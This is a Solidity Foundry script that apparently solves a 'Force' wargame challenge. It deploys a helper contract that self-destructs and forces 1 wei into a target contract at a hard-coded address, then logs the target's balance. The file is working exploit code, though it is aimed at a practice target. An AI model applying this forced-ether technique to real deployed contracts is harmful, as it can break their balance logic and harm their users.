//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {Force} from "../src/Force.sol";

 contract ForceAttack {
    function destroy(address payable _to) external payable  {
       selfdestruct(_to);
    }
  }


contract ForceSolution is Script {

  Force forceInstance = Force(0x1b03788484e2bb290c41163ab69737A3954961cE);

  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    ForceAttack forceAttact = new ForceAttack();
    forceAttact.destroy{value: 1 wei}(payable(address(forceInstance)));
    console.log("Balance: ", address(forceInstance).balance);
    vm.stopBroadcast();
  }
}